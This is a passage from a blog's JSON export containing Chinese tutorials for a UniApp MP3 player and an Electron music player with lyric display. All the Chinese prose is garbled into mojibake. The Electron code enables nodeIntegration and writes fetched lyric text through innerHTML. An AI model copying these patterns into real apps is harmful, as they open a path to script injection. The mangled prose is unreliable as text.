ç”¨äºå±•ç¤ºäºŒç»´ç çš„å®¹å™¨ --&gt; &lt;div id=&quot;qrcode-container&quot; class=&quot;qrcode-container&quot;&gt;&lt;/div&gt; &lt;a href=&quot;https://www.yuque.com/&quot; class=&quot;togo text-center text-muted is-views&quot; data-id=&quot;689&quot; data-toggle=&quot;tooltip&quot; data-placement=&quot;right&quot; title=&quot;&quot; rel=&quot;nofollow&quot; data-original-title=&quot;ç›´è¾¾&quot;&gt; &lt;i class=&quot;iconfont icon-goto&quot;&gt;&lt;/i&gt; &lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt; 12345678910111213141516171819window.onload = function () &#123; const generateBtn = document.getElementById(&#x27;generate-qr-btn&#x27;); const qrCodeContainer = document.getElementById(&#x27;qrcode-container&#x27;); generateBtn.addEventListener(&#x27;mouseover&#x27;, function () &#123; // ä»æŒ‰é’®çš„è‡ªå®šä¹‰å±æ€§data-target-urlè·å–è¦ç”ŸæˆäºŒç»´ç çš„ç›®æ ‡é“¾æ¥ const targetLink = generateBtn.dataset.targetUrl; const qrcode = new QRCode(qrCodeContainer, &#123; text: targetLink, width: 128, height: 128 &#125;); qrCodeContainer.style.display = &#x27;block&#x27;; &#125;); generateBtn.addEventListener(&#x27;mouseout&#x27;, function () &#123; qrCodeContainer.style.display = &#x27;none&#x27;; &#125;);&#125;; åœ¨æŒ‰é’®å…ƒç´ ä¸Šæ–°å¢äº†ä¸€ä¸ªè‡ªå®šä¹‰å±æ€§data-target-urlï¼Œå¹¶å°†éœ€è¦ç”ŸæˆäºŒç»´ç å¯¹åº”çš„ç›®æ ‡é“¾æ¥ï¼ˆè¿™é‡Œæ˜¯è¯­é›€å®˜ç½‘é“¾æ¥ï¼‰èµ‹å€¼ç»™è¯¥å±æ€§ã€‚è¿™æ ·ï¼Œåœ¨ä¸åŒçš„åœºæ™¯ä¸‹ï¼Œå¦‚æœè¦ä¸ºå…¶ä»–é“¾æ¥ç”ŸæˆäºŒç»´ç ï¼Œåªéœ€è¦ä¿®æ”¹æŒ‰é’®è¿™ä¸ªè‡ªå®šä¹‰å±æ€§çš„å€¼å³å¯ï¼Œè€Œä¸éœ€è¦å»ä¿®æ”¹ JavaScript ä»£ç ä¸­é€‰æ‹©å…ƒç´ è·å–é“¾æ¥çš„é€»è¾‘ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"jquery","slug":"jquery","permalink":"https://banjinmei.github.io/tags/jquery/"},{"name":"qrcode","slug":"qrcode","permalink":"https://banjinmei.github.io/tags/qrcode/"}],"author":"mu"},{"title":"electron uniapp mp3","slug":"electron-uniapp-mp3","date":"2024-09-19T15:29:51.000Z","updated":"2024-09-20T17:43:43.239Z","comments":true,"path":"2024/09/19/electron-uniapp-mp3/","permalink":"https://banjinmei.github.io/2024/09/19/electron-uniapp-mp3/","excerpt":"","text":"å‰è¨€éŸ³ä¹APPç‰ˆæƒ&#x2F;å¹¿å‘Šé—®é¢˜ï¼Œè®©å¬æ­Œä½“éªŒå¾ˆå·®ï¼Œæ‰€ä»¥è‡ªå·±æ•´ä¸ªç®€å•çš„æ’­æ”¾å™¨~ Uniapp MP31. åˆ›å»ºé¡¹ç›®åœ¨ HBuilderX ä¸­ï¼Œæ–°å»ºä¸€ä¸ª UniApp é¡¹ç›®ï¼Œé¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š 123456- pages/ - index/ - index.vue- static/- manifest.json- pages.json 2. é¡µé¢è®¾è®¡å’Œé€»è¾‘index.vue æ–‡ä»¶åœ¨ pages&#x2F;index&#x2F;index.vue æ–‡ä»¶ä¸­å®ç°æ’­æ”¾å™¨çš„ç•Œé¢å’Œé€»è¾‘ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;text class=&quot;title&quot;&gt;UniApp éŸ³ä¹æ’­æ”¾å™¨&lt;/text&gt; &lt;view class=&quot;controls&quot;&gt; &lt;button @click=&quot;prevTrack&quot;&gt;ä¸Šä¸€é¦–&lt;/button&gt; &lt;button @click=&quot;playPause&quot;&gt;&#123;&#123; isPlaying ? &#x27;æš‚åœ&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125;&lt;/button&gt; &lt;button @click=&quot;nextTrack&quot;&gt;ä¸‹ä¸€é¦–&lt;/button&gt; &lt;/view&gt; &lt;text&gt;&#123;&#123; currentTrack.name &#125;&#125;&lt;/text&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; audioContext: null, isPlaying: false, currentTrackIndex: 0, tracks: [ &#123; name: &#x27;æ­Œæ›² 1&#x27;, url: &#x27;https://example.com/song1.mp3&#x27; &#125;, &#123; name: &#x27;æ­Œæ›² 2&#x27;, url: &#x27;https://example.com/song2.mp3&#x27; &#125;, &#123; name: &#x27;æ­Œæ›² 3&#x27;, url: &#x27;https://example.com/song3.mp3&#x27; &#125; ] &#125; &#125;, computed: &#123; currentTrack() &#123; return this.tracks[this.currentTrackIndex]; &#125; &#125;, methods: &#123; playPause() &#123; if (this.isPlaying) &#123; this.audioContext.pause(); &#125; else &#123; this.audioContext.src = this.currentTrack.url; this.audioContext.play(); &#125; this.isPlaying = !this.isPlaying; &#125;, prevTrack() &#123; this.currentTrackIndex = (this.currentTrackIndex - 1 + this.tracks.length) % this.tracks.length; this.playTrack(); &#125;, nextTrack() &#123; this.currentTrackIndex = (this.currentTrackIndex + 1) % this.tracks.length; this.playTrack(); &#125;, playTrack() &#123; this.isPlaying = false; this.playPause(); &#125; &#125;, onReady() &#123; this.audioContext = uni.createInnerAudioContext(); &#125;, onUnload() &#123; this.audioContext.destroy(); &#125;&#125;&lt;/script&gt;&lt;style&gt;.container &#123; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;&#125;.title &#123; font-size: 24px; margin-bottom: 20px;&#125;.controls &#123; display: flex; justify-content: space-around; width: 80%; margin-bottom: 20px;&#125;button &#123; padding: 10px 20px; background-color: #007AFF; color: white; border: none; border-radius: 5px; font-size: 16px;&#125;text &#123; font-size: 18px;&#125;&lt;/style&gt; ios â€‹ 3. é…ç½® Android æƒé™åœ¨ manifest.json æ–‡ä»¶ä¸­ï¼Œç¡®ä¿é…ç½®äº†éŸ³é¢‘æ’­æ”¾æ‰€éœ€çš„æƒé™ï¼š 123456789101112&#123; &quot;app-plus&quot;: &#123; &quot;distribute&quot;: &#123; &quot;android&quot;: &#123; &quot;permissions&quot;: [ &quot;android.permission.INTERNET&quot;, &quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; ] &#125; &#125; &#125;&#125; 4. æ‰“åŒ… APKæ‰“å¼€ HBuilderXï¼Œç‚¹å‡»â€œå‘è¡Œâ€ -&gt; â€œåŸç”ŸApp-äº‘æ‰“åŒ…â€ã€‚é€‰æ‹©å¹³å°ä¸º Androidï¼Œå¡«å†™åº”ç”¨ä¿¡æ¯ï¼ˆåŒ…åã€ç­¾åç­‰ï¼‰ã€‚ä¸Šä¼ å›¾æ ‡ç­‰èµ„æºï¼Œå®Œæˆæ‰“åŒ…ã€‚æ‰“åŒ…åè·å¾— .apk æ–‡ä»¶ï¼Œå¯ä»¥å®‰è£…åˆ°å®‰å“è®¾å¤‡ä¸Š&#x2F;æ¨¡æ‹Ÿå™¨è¿›è¡Œæµ‹è¯•ã€‚ &#x2F;unpackage&#x2F;release&#x2F;apk&#x2F;__UNI_XXX.apkandroidâ€‹ 5.æ­Œæ›²åˆ—è¡¨123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191&lt;template&gt; &lt;view class=&quot;container&quot;&gt; &lt;!-- å±…ä¸­æ˜¾ç¤ºæ­Œæ›²å›¾ç‰‡ --&gt; &lt;view class=&quot;cover-container&quot;&gt; &lt;image class=&quot;cover&quot; :src=&quot;currentSong.img&quot; mode=&quot;aspectFill&quot;&gt;&lt;/image&gt; &lt;/view&gt; &lt;!-- æ˜¾ç¤ºæ­Œæ›²å --&gt; &lt;text class=&quot;title&quot;&gt;&#123;&#123; currentSong.name &#125;&#125;&lt;/text&gt; &lt;!-- è‡ªåŠ¨æ»šåŠ¨çš„æ­Œè¯ --&gt; &lt;scroll-view class=&quot;lyrics&quot; scroll-y :scroll-top=&quot;scrollTop&quot; :scroll-with-animation=&quot;true&quot;&gt; &lt;view v-for=&quot;(line, index) in lyrics&quot; :key=&quot;index&quot; :class=&quot;&#123;&#x27;active-lyric&#x27;: currentLyricIndex === index, &#x27;lyric&#x27;: true&#125;&quot;&gt; &#123;&#123; line.text &#125;&#125; &lt;/view&gt; &lt;/scroll-view&gt; &lt;!-- æ’­æ”¾æ§åˆ¶æŒ‰é’® --&gt; &lt;view class=&quot;controls&quot;&gt; &lt;button @click=&quot;prevSong&quot;&gt;ä¸Šä¸€æ›²&lt;/button&gt; &lt;button @click=&quot;togglePlay&quot;&gt;&#123;&#123; isPlaying ? &#x27;æš‚åœ&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125;&lt;/button&gt; &lt;button @click=&quot;nextSong&quot;&gt;ä¸‹ä¸€æ›²&lt;/button&gt; &lt;/view&gt; &lt;!-- æ’­æ”¾åˆ—è¡¨ --&gt; &lt;view class=&quot;playlist&quot;&gt; &lt;text v-for=&quot;(song, index) in playlist&quot; :key=&quot;index&quot; @click=&quot;playSong(song)&quot;&gt; &#123;&#123; song.name &#125;&#125; &lt;/text&gt; &lt;/view&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data() &#123; return &#123; currentSong: &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27;, &#125;, isPlaying: false, audioPlayer: null, playlist: [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;, ], lyrics: [], // æ­Œè¯è¡Œ currentLyricIndex: 0, // å½“å‰æ­Œè¯ç´¢å¼• scrollTop: 0, // æ­Œè¯æ»šåŠ¨ä½ç½® audioDuration: 0, // éŸ³é¢‘æ€»æ—¶é•¿ &#125;; &#125;, methods: &#123; loadLyrics(lrcFile) &#123; // åŠ è½½æ­Œè¯æ–‡ä»¶å¹¶è§£æ uni.request(&#123; url: lrcFile, success: (res) =&gt; &#123; const lrcLines = res.data.split(&#x27;\\n&#x27;); // æ›´æ–°æ­£åˆ™è¡¨è¾¾å¼ä»¥å¤„ç†ä¸åŒæ ¼å¼çš„æ—¶é—´æˆ³ this.lyrics = lrcLines.map(line =&gt; &#123; const match = line.match(/\\[(\\d&#123;2&#125;):(\\d&#123;2&#125;)(?:\\.(\\d&#123;1,3&#125;))?\\](.*)/); if (match) &#123; const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, &#x27;0&#x27;)) : 0; // è¡¥å…¨æ¯«ç§’åˆ°ä¸‰ä½æ•° const time = minutes * 60 + seconds + milliseconds / 1000; return &#123; time, text: match[4] &#125;; &#125; return &#123; time: 0, text: line &#125;; &#125;); &#125;, &#125;); &#125;, playSong(song) &#123; // åœæ­¢å½“å‰æ’­æ”¾çš„éŸ³ä¹ if (this.audioPlayer) &#123; this.audioPlayer.stop(); &#125; // åˆ‡æ¢åˆ°é€‰ä¸­çš„æ­Œæ›² this.currentSong = song; this.loadLyrics(song.lrc); this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = song.audio; this.audioPlayer.play(); this.isPlaying = true; // ç›‘å¬æ’­æ”¾è¿›åº¦ this.audioPlayer.onTimeUpdate(() =&gt; &#123; this.updateLyric(); &#125;); // ç›‘å¬æ’­æ”¾ç»“æŸ this.audioPlayer.onEnded(() =&gt; &#123; this.nextSong(); &#125;); &#125;, togglePlay() &#123; if (this.isPlaying) &#123; this.audioPlayer.pause(); &#125; else &#123; this.audioPlayer.play(); &#125; this.isPlaying = !this.isPlaying; &#125;, prevSong() &#123; const currentIndex = this.playlist.findIndex(song =&gt; song.name === this.currentSong.name); const prevIndex = (currentIndex - 1 + this.playlist.length) % this.playlist.length; this.playSong(this.playlist[prevIndex]); &#125;, nextSong() &#123; const currentIndex = this.playlist.findIndex(song =&gt; song.name === this.currentSong.name); const nextIndex = (currentIndex + 1) % this.playlist.length; this.playSong(this.playlist[nextIndex]); &#125;, updateLyric() &#123; const currentTime = this.audioPlayer.currentTime; for (let i = 0; i &lt; this.lyrics.length; i++) &#123; if (i === this.lyrics.length - 1 || (currentTime &gt;= this.lyrics[i].time &amp;&amp; currentTime &lt; this.lyrics[i + 1].time)) &#123; this.currentLyricIndex = i; this.scrollTop = i * 40; // æ»šåŠ¨åˆ°å½“å‰æ­Œè¯ break; &#125; &#125; &#125; &#125;, mounted() &#123; // é»˜è®¤åŠ è½½ç¬¬ä¸€é¦–æ­Œçš„æ­Œè¯ this.loadLyrics(this.currentSong.lrc); // åˆ›å»ºéŸ³é¢‘æ’­æ”¾å™¨ this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; &#125;, beforeDestroy() &#123; if (this.audioPlayer) &#123; this.audioPlayer.destroy(); &#125; &#125;&#125;;&lt;/script&gt;&lt;style&gt;.container &#123; padding: 20px;&#125;.cover-container &#123; display: flex; justify-content: center; align-items: center;&#125;.cover &#123; width: 280px; height: 280px; border-radius: 10px;&#125;.title &#123; font-size: 24px; text-align: center; margin: 10px 0;&#125;.lyrics &#123; height: 150px; overflow-y: auto; margin: 20px 0; border: 1px solid #ddd; padding: 10px;&#125;.lyric &#123; font-size: 16px; line-height: 40px;&#125;.active-lyric &#123; color: #ff4081; font-weight: bold;&#125;.controls &#123; display: flex; justify-content: space-between;&#125;.playlist &#123; margin-top: 20px;&#125;.playlist text &#123; cursor: pointer; display: block; margin: 5px 0;&#125;&lt;/style&gt; 6.æ­Œæ›²é«˜äº®1234567:class=&quot;&#123;&#x27;active-song&#x27;: song.name === currentSong.name&#125;css .active-song &#123; color: #ff4081; font-weight: bold;&#125; 7.æ­Œè¯æ˜¾ç¤ºä¸Šä¸€è¡Œ1234567//loadLyrics // ç§»é™¤æœ€åä¸€è¡Œï¼ˆç¬¬å››è¡Œï¼‰ if (this.lyrics.length &gt; 3) &#123; this.lyrics.pop(); &#125;//updateLyric this.scrollTop = (i - 1) * 40; // æ»šåŠ¨ä½ç½®è°ƒæ•´åˆ°å‰ä¸€è¡Œï¼Œç¡®ä¿å‰ä¸€è¡Œä¹Ÿèƒ½æ˜¾ç¤º 8.è¯·æ±‚æœåŠ¡å™¨data.jsåŠ è½½æ›²ç›®12345678910111213141516171819202122//load uni.request(&#123; url: &#x27;http://xxx:8080/group1/mpdata/dt/datajsonuni2.js?download=0&#x27;, method: &#x27;GET&#x27;, success: (res) =&gt; &#123; if (res.statusCode === 200) &#123; console.log(res); this.playlist = res.data; // é»˜è®¤åŠ è½½ç¬¬ä¸€é¦–æ­Œçš„ä¿¡æ¯ this.currentSong = this.playlist[0]; this.loadLyrics(this.currentSong.lrc); // åˆ›å»ºéŸ³é¢‘æ’­æ”¾å™¨ this.audioPlayer = uni.createInnerAudioContext(); this.audioPlayer.src = this.currentSong.audio; &#125; else &#123; console.error(&#x27;Failed to fetch playlist data&#x27;); &#125; &#125;, fail: () =&gt; &#123; console.error(&#x27;Request failed&#x27;); &#125; &#125;); 9.playlistå¤ªå¤šå¤„ç†å›ºå®šé«˜åº¦ æ»‘åŠ¨ 1234567.playlist &#123; margin-top: 20px; height:160px; overflow-y: auto; &#125; è¿™æ ·ä¸€ä¸ªå»ºè®®çš„éŸ³ä¹æ’­æ”¾å™¨å°±okäº†~ electronç‰ˆæœ¬1. åˆå§‹åŒ–é¡¹ç›®ä½¿ç”¨ npm init å‘½ä»¤åˆ›å»º package.json æ–‡ä»¶ï¼š 1npm init -y è¿™å°†åˆ›å»ºä¸€ä¸ªé»˜è®¤çš„ package.json æ–‡ä»¶ã€‚ 2. å®‰è£… Electronä½¿ç”¨ npm å®‰è£… Electronï¼š 1npm install electron --save-dev 3.Electronä¸»è¿›ç¨‹main.js 12345678910111213141516171819202122232425262728293031323334353637383940const &#123; app, BrowserWindow, dialog &#125; = require(&#x27;electron&#x27;);const path = require(&#x27;path&#x27;);let win;function createWindow () &#123; win = new BrowserWindow(&#123; width: 800, height: 600, webPreferences: &#123; preload: path.join(__dirname, &#x27;preload.js&#x27;), nodeIntegration: true, // å…è®¸åœ¨æ¸²æŸ“è¿›ç¨‹ä¸­ä½¿ç”¨ Node.js API &#125; &#125;); // åŠ è½½ index.html win.loadFile(&#x27;index.html&#x27;); // æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼ˆå¯é€‰ï¼‰ win.webContents.openDevTools(); win.on(&#x27;closed&#x27;, () =&gt; &#123; win = null; &#125;);&#125;app.whenReady().then(createWindow);app.on(&#x27;window-all-closed&#x27;, () =&gt; &#123; if (process.platform !== &#x27;darwin&#x27;) &#123; app.quit(); &#125;&#125;);app.on(&#x27;activate&#x27;, () =&gt; &#123; if (BrowserWindow.getAllWindows().length === 0) &#123; createWindow(); &#125;&#125;); 4.å‰ç«¯ åˆ›å»º index.html æ–‡ä»¶ä½œä¸ºéŸ³ä¹æ’­æ”¾å™¨çš„ç•Œé¢ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt; M Player&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; text-align: center; &#125; .player &#123; margin-top: 50px; &#125; audio &#123; width: 100%; margin-top: 20px; &#125; button &#123; margin: 5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Simple Music Player&lt;/h1&gt; &lt;div class=&quot;player&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileInput&quot; accept=&quot;audio/*&quot; /&gt; &lt;audio id=&quot;audioPlayer&quot; controls&gt; Your browser does not support the audio element. &lt;/audio&gt; &lt;br/&gt; &lt;button id=&quot;prevBtn&quot;&gt;Previous&lt;/button&gt; &lt;button id=&quot;nextBtn&quot;&gt;Next&lt;/button&gt; &lt;/div&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5.åˆ›å»ºæ¸²æŸ“è¿›ç¨‹è„šæœ¬ renderer.jsè¿™ä¸ªæ–‡ä»¶å¤„ç†å‰ç«¯é€»è¾‘ï¼ŒåŒ…æ‹¬åŠ è½½éŸ³ä¹æ–‡ä»¶ã€æ’­æ”¾ã€æš‚åœã€åˆ‡æ¢æ›²ç›®ç­‰åŠŸèƒ½ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445const audioPlayer = document.getElementById(&#x27;audioPlayer&#x27;);const fileInput = document.getElementById(&#x27;fileInput&#x27;);const prevBtn = document.getElementById(&#x27;prevBtn&#x27;);const nextBtn = document.getElementById(&#x27;nextBtn&#x27;);let playlist = [];let currentTrackIndex = 0;// å½“é€‰æ‹©éŸ³ä¹æ–‡ä»¶æ—¶ï¼ŒåŠ è½½å¹¶æ’­æ”¾fileInput.addEventListener(&#x27;change&#x27;, (event) =&gt; &#123; const files = event.target.files; if (files.length &gt; 0) &#123; playlist = Array.from(files); currentTrackIndex = 0; loadTrack(currentTrackIndex); &#125;&#125;);// åŠ è½½å¹¶æ’­æ”¾æŒ‡å®šç´¢å¼•çš„æ­Œæ›²function loadTrack(index) &#123; const track = playlist[index]; if (track) &#123; const url = URL.createObjectURL(track); audioPlayer.src = url; audioPlayer.play(); &#125;&#125;// åˆ‡æ¢åˆ°ä¸Šä¸€é¦–æ­Œæ›²prevBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &gt; 0) &#123; currentTrackIndex--; loadTrack(currentTrackIndex); &#125;&#125;);// åˆ‡æ¢åˆ°ä¸‹ä¸€é¦–æ­Œæ›²nextBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &lt; playlist.length - 1) &#123; currentTrackIndex++; loadTrack(currentTrackIndex); &#125;&#125;); 6.å›¾ç‰‡&amp;æ­Œè¯123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109const audioPlayer = document.getElementById(&#x27;audioPlayer&#x27;);const songImage = document.getElementById(&#x27;songImage&#x27;);const songTitle = document.getElementById(&#x27;songTitle&#x27;);const lyricsDisplay = document.getElementById(&#x27;lyricsDisplay&#x27;);const prevBtn = document.getElementById(&#x27;prevBtn&#x27;);const nextBtn = document.getElementById(&#x27;nextBtn&#x27;);let playlist = [ &#123; name: &#x27;song1&#x27;, img: &#x27;/static/song1.jpg&#x27;, audio: &#x27;/static/song1.mp3&#x27;, lrc: &#x27;/static/song1.lrc&#x27; &#125;, &#123; name: &#x27;song2&#x27;, img: &#x27;/static/song2.jpg&#x27;, audio: &#x27;/static/song2.mp3&#x27;, lrc: &#x27;/static/song2.lrc&#x27; &#125;,];let currentTrackIndex = 0;let lyrics = [];let currentLyricIndex = 0;// åŠ è½½å½“å‰æ›²ç›®çš„æ­Œè¯æ–‡ä»¶function loadLyrics(lrcFile) &#123; fetch(lrcFile) .then(response =&gt; response.text()) .then(text =&gt; &#123; lyrics = parseLyrics(text); displayLyrics(); &#125;);&#125;// è§£ææ­Œè¯æ–‡ä»¶ä¸ºæ—¶é—´æˆ³å’Œæ–‡æœ¬å¯¹function parseLyrics(lrcText) &#123; const lines = lrcText.split(&#x27;\\n&#x27;); const lrcData = lines.map(line =&gt; &#123; const match = line.match(/\\[(\\d&#123;2&#125;):(\\d&#123;2&#125;)(?:\\.(\\d&#123;1,3&#125;))?\\](.*)/); if (match) &#123; const minutes = parseInt(match[1]); const seconds = parseInt(match[2]); const milliseconds = match[3] ? parseInt(match[3].padEnd(3, &#x27;0&#x27;)) : 0; const time = minutes * 60 + seconds + milliseconds / 1000; return &#123; time, text: match[4].trim() &#125;; &#125; return &#123; time: 0, text: line.trim() &#125;; &#125;); return lrcData.filter(line =&gt; line.text); // è¿‡æ»¤æ‰ç©ºç™½è¡Œ&#125;// åœ¨é¡µé¢ä¸­æ˜¾ç¤ºæ­Œè¯function displayLyrics() &#123; lyricsDisplay.innerHTML = lyrics .map((line, index) =&gt; `&lt;p id=&quot;lyric-$&#123;index&#125;&quot;&gt;$&#123;line.text&#125;&lt;/p&gt;`) .join(&#x27;&#x27;);&#125;// æ›´æ–°å½“å‰æ’­æ”¾çš„æ­Œè¯function updateLyrics(currentTime) &#123; for (let i = 0; i &lt; lyrics.length; i++) &#123; if (i === lyrics.length - 1 || (currentTime &gt;= lyrics[i].time &amp;&amp; currentTime &lt; lyrics[i + 1].time)) &#123; if (currentLyricIndex !== i) &#123; currentLyricIndex = i; highlightLyric(currentLyricIndex); &#125; break; &#125; &#125;&#125;// é«˜äº®å½“å‰æ­Œè¯function highlightLyric(index) &#123; const currentLyric = document.getElementById(`lyric-$&#123;index&#125;`); if (currentLyric) &#123; document.querySelectorAll(&#x27;#lyricsDisplay p&#x27;).forEach(lyric =&gt; lyric.classList.remove(&#x27;highlight&#x27;)); currentLyric.classList.add(&#x27;highlight&#x27;); lyricsDisplay.scrollTop = currentLyric.offsetTop - lyricsDisplay.offsetTop; &#125;&#125;// åŠ è½½å¹¶æ’­æ”¾æŒ‡å®šç´¢å¼•çš„æ­Œæ›²function loadTrack(index) &#123; const track = playlist[index]; if (track) &#123; songTitle.textContent = track.name; songImage.src = track.img; audioPlayer.src = track.audio; loadLyrics(track.lrc); audioPlayer.play(); &#125;&#125;// åˆ‡æ¢åˆ°ä¸Šä¸€é¦–æ­Œæ›²prevBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &gt; 0) &#123; currentTrackIndex--; loadTrack(currentTrackIndex); &#125;&#125;);// åˆ‡æ¢åˆ°ä¸‹ä¸€é¦–æ­Œæ›²nextBtn.addEventListener(&#x27;click&#x27;, () =&gt; &#123; if (currentTrackIndex &lt; playlist.length - 1) &#123; currentTrackIndex++; loadTrack(currentTrackIndex); &#125;&#125;);// ç›‘å¬éŸ³ä¹æ’­æ”¾è¿›åº¦ï¼Œæ›´æ–°æ­Œè¯audioPlayer.addEventListener(&#x27;timeupdate&#x27;, () =&gt; &#123; updateLyrics(audioPlayer.currentTime);&#125;);// åˆå§‹åŠ è½½ç¬¬ä¸€é¦–æ­Œæ›²loadTrack(currentTrackIndex); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt; M Player&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; text-align: center; &#125; .player &#123; margin-top: 50px; &#125; audio &#123; width: 100%; margin-top: 20px; &#125; button &#123; margin: 5px; &#125; #songImage &#123; width: 280px; height: 280px; margin-top: 20px; &#125; #lyricsDisplay &#123; max-height: 200px; overflow-y: auto; margin-top: 20px; text-align: left; padding: 0 20px; &#125; #lyricsDisplay p &#123; margin: 5px 0; &#125; .highlight &#123; color: #ff5722; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Music Player&lt;/h1&gt; &lt;div class=&quot;player&quot;&gt; &lt;h2 id=&quot;songTitle&quot;&gt;Song Title&lt;/h2&gt; &lt;img id=&quot;songImage&quot; src=&quot;&quot; alt=&quot;Song Image&quot; /&gt; &lt;audio id=&quot;audioPlayer&quot; controls&gt;&lt;/audio&gt; &lt;br/&gt; &lt;button id=&quot;prevBtn&quot;&gt;Previous&lt;/button&gt; &lt;button id=&quot;nextBtn&quot;&gt;Next&lt;/button&gt; &lt;div id=&quot;lyricsDisplay&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;renderer.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; åŠŸèƒ½è¯´æ˜ï¼šæ’­æ”¾åˆ—è¡¨ï¼šé€šè¿‡é¢„å®šä¹‰çš„ playlist æ•°ç»„æ¥ç®¡ç†æ­Œæ›²ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ­Œæ›²åã€å°é¢å›¾ç‰‡ã€éŸ³é¢‘æ–‡ä»¶è·¯å¾„å’Œæ­Œè¯æ–‡ä»¶è·¯å¾„ã€‚æ˜¾ç¤ºæ­Œæ›²ä¿¡æ¯ï¼šæ’­æ”¾æ—¶ï¼Œä¼šæ˜¾ç¤ºæ­Œæ›²å°é¢å’Œæ ‡é¢˜ï¼ŒåŠ è½½å¹¶è§£æ .lrc æ–‡ä»¶ä¸­çš„æ­Œè¯ã€‚æ­Œè¯æ»šåŠ¨ï¼šé€šè¿‡ç›‘å¬ audioPlayer çš„ timeupdate äº‹ä»¶ï¼Œæ ¹æ®å½“å‰æ’­æ”¾çš„æ—¶é—´é«˜äº®æ˜¾ç¤ºå¯¹åº”çš„æ­Œè¯ï¼Œå¹¶è‡ªåŠ¨æ»šåŠ¨æ­Œè¯åŒºåŸŸã€‚ä¸Šä¸€é¦–&#x2F;ä¸‹ä¸€é¦–åˆ‡æ¢ï¼šç”¨æˆ·å¯ä»¥é€šè¿‡æŒ‰é’®æ¥åˆ‡æ¢æ­Œæ›²ã€‚ 7.æ‰“åŒ…Electronåº”ç”¨1. å®‰è£…å¿…è¦çš„åŒ…åœ¨Electron é¡¹ç›®ä¸­ï¼Œé€šå¸¸ç”¨ electron-packager æˆ– electron-builder è¿™æ ·çš„å·¥å…·æ¥æ‰“åŒ…åº”ç”¨ 1npm install electron-packager --save-dev 2. é…ç½® package.jsonelectron-packager: 123&quot;scripts&quot;: &#123; &quot;package-win&quot;: &quot;electron-packager . MyApp --platform=win32 --arch=x64 --icon=icon.ico&quot; &#125;, 3.run packelectron-packager: 1npm run package-win add icon 1--icon=icon.png win â€‹ linux â€‹ 4.æ‰“åŒ…linuxä½¿ç”¨ electron-packager æ‰“åŒ… Linux åº”ç”¨ä¸æ‰“åŒ… Windows æˆ– macOS åº”ç”¨ç±»ä¼¼ï¼Œä½†éœ€è¦æŒ‡å®šä¸åŒçš„å¹³å°ï¼ˆâ€“platformï¼‰å’Œå¯èƒ½çš„æ¶æ„ï¼ˆâ€“archï¼‰ã€‚å¯¹äº Linuxï¼Œâ€“platform åº”è¯¥æ˜¯ linuxï¼Œè€Œ â€“arch å¯ä»¥æ˜¯ x64ï¼ˆ64ä½ï¼‰æˆ– ia32ï¼ˆ32ä½ï¼‰ï¼Œå…·ä½“å–å†³äºç›®æ ‡ç³»ç»Ÿã€‚ 